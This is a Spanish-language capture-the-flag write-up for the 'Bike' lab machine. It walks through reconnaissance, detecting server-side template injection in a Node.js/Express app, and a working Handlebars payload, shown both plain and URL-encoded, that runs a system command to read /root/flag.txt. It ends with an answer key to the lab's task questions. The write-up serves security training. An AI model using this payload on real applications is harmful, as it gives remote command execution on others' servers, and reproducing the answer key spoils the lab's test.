# Bike

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **Custom Applications (Aplicaciones Personalizadas):** Son aplicaciones desarrolladas específicamente para satisfacer necesidades particulares de una organización. A menudo, estas aplicaciones no se desarrollan siguiendo las mejores prácticas de seguridad, lo que puede dar lugar a vulnerabilidades. Dado que son personalizadas, pueden ser difíciles de mantener y auditar, lo que aumenta el riesgo de ser objetivo de un ataque si no se gestionan adecuadamente.
  * **NodeJS:** Es un entorno de ejecución para JavaScript en el servidor, ampliamente utilizado para construir aplicaciones web escalables y rápidas. Aunque es potente y flexible, si no se implementa correctamente o se usan dependencias inseguras, NodeJS puede ser vulnerable a ataques como la ejecución remota de código o la inyección de dependencias maliciosas.
  * **Reconnaissance (Reconocimiento):** Es una fase inicial crucial en el proceso de pruebas de penetración, en la que se recopila información sobre el objetivo. Esto incluye escaneo de puertos, identificación de servicios y posibles vulnerabilidades, y análisis de la infraestructura. El objetivo del reconocimiento es descubrir posibles puntos de entrada y explotar configuraciones incorrectas.
  * **Remote Code Execution (Ejecución Remota de Código):** Es una vulnerabilidad crítica que permite a un atacante ejecutar código malicioso en el sistema de la víctima de manera remota. Puede explotarse a través de diversos vectores como aplicaciones web, servicios mal configurados o vulnerabilidades en el software. La ejecución remota de código pone en peligro la integridad y la confidencialidad de los sistemas afectados.
  * **Server Side Template Injection (SSTI) (Inyección de Plantillas del Lado del Servidor):** Es una vulnerabilidad que ocurre cuando un atacante puede inyectar código malicioso en las plantillas del lado del servidor, lo que permite la ejecución de código en el servidor. Esta vulnerabilidad puede ser utilizada para ejecutar comandos del sistema operativo, robar datos o comprometer el servidor, especialmente si el sistema de plantillas no valida correctamente los datos introducidos por el usuario.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.97.64
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sCV -Pn 10.129.97.64
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el puerto **22** perteneciente al servicio **SSH** y el puerto **80** correspondiente a **HTTP** están abiertos. A continuación, se indagará más sobre estos servicios.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-13 181725.png" alt=""><figcaption></figcaption></figure>

Vemos la información de la página.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-13 182158.png" alt=""><figcaption></figcaption></figure>

Ponemos `{{7*7}}` para ver si tenemos una vulnerabilidad SSTI.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Copiamos el payload de Node.js.

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html" %}

```bash
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```

Codificamos el código en formato URL y lo pegamos en el campo email de la petición.

```bash
%77%72%74%7a%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%63%61%74%20%2f%72%6f%6f%74%2f%66%6c%61%67%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d%0a
```

### 5. 🔑 **Captura de la Flag**

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

**Task 1:** ¿Qué puertos TCP identifica nmap como abiertos? Responde con una lista de puertos separados por comas y sin espacios, de menor a mayor.

* **22,80**

**Task 2:** ¿Qué software está ejecutando el servicio que escucha en el puerto HTTP/web identificado en la primera pregunta?

* **node.js**

**Task 3:** ¿Cuál es el nombre del marco web según Wappalyzer?

* **express**

**Task 4:** ¿Cuál es el nombre de la vulnerabilidad que probamos enviando \{{7\*7\}}?

* **Server Side Template Injection**

**Task 5:** ¿Cuál es el motor de plantillas que se está utilizando dentro de Node.js?

* **handlebars**

**Task 6:** ¿Cuál es el nombre de la pestaña de BurpSuite utilizada para codificar texto?

* **decoder**

**Task 7:** Para enviar caracteres especiales en nuestra carga útil en una solicitud HTTP, codificamos la carga útil. ¿Qué tipo de codificación usamos?

* **url**

**Task 8:** Cuando usamos una carga útil de HackTricks para intentar ejecutar comandos del sistema, obtenemos un error. ¿Qué es lo que "no está definido" en el error de respuesta?

* **require**

**Task 9:** ¿Qué variable es tradicionalmente el nombre del ámbito de nivel superior en el contexto del navegador, pero no en Node.js?

* **global**

**Task 10:** Al explotar esta vulnerabilidad, obtenemos ejecución de comandos como el usuario que ejecuta el servidor web. ¿Cuál es el nombre de ese usuario?

* **root**
